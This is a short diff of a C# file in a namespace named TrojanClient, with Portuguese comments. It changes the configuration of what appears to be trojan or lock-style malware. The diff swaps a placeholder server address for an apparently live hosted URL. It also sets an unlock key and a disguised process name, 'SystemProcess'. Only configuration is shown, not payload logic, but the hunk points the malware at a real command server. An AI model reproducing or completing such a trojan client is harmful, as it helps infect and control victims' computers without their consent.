@@ -40,7 +40,7 @@ namespace TrojanClient
         // ============================================
         // CONFIGURACAO
         // ============================================
-        static string SERVER_URL = "http://SEU_IP:5000"; // Troque pelo IP do servidor
+        static string SERVER_URL = "https://asfadsfsdfs.onrender.com"; // Troque pelo IP do servidor
         static string UNLOCK_KEY = "azzez";
         static string PROGRAM_NAME = "SystemProcess";
 
